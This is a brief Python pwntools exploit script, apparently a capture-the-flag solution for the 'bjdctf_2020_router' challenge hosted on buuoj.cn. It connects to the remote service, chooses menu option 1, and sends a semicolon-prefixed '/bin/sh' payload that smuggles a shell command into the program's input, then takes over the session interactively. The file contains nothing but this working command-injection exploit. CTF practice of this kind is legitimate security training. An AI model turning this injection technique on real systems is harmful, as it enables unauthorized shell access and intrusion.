from pwn import *


# p = process("./bjdctf_2020_router")
p = remote("node4.buuoj.cn", 26367)


p.recvuntil("Please input u choose:\n")
p.sendline("1")
pad = b";"+b"/bin/sh\x00"
p.send(pad)

p.interactive()

